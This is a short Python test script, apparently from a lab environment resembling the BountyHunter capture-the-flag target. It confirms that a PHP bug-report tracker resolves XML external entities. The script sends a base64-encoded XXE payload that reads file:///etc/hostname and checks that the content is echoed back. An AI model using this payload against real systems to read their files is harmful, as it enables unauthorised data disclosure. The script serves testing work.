#!/usr/bin/env python3
"""Verify PHP SimpleXML's real external-file handling with harmless fixture files."""
import base64
import html
import os
import urllib.parse
import urllib.request

expected_host = os.environ["EXPECTED_TARGET_HOSTNAME"].strip()
assert expected_host

xml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bugreport [<!ENTITY labfile SYSTEM "file:///etc/hostname">]>'
    '<bugreport><title>Service Check</title><cwe>CWE-611</cwe>'
    '<cvss>2</cvss><reward>&labfile;</reward></bugreport>'
)
form = urllib.parse.urlencode({"data": base64.b64encode(xml.encode()).decode()}).encode()
req = urllib.request.Request("http://bountyhunter-target/tracker_diRbPr00f314.php", data=form)
with urllib.request.urlopen(req, timeout=10) as response:
    body = html.unescape(response.read().decode("utf-8", "replace"))

assert expected_host in body, "The real host file was not read by the PHP XML parser"
print("PASS: real libxml general entity resolves an existing non-secret OS file", flush=True)
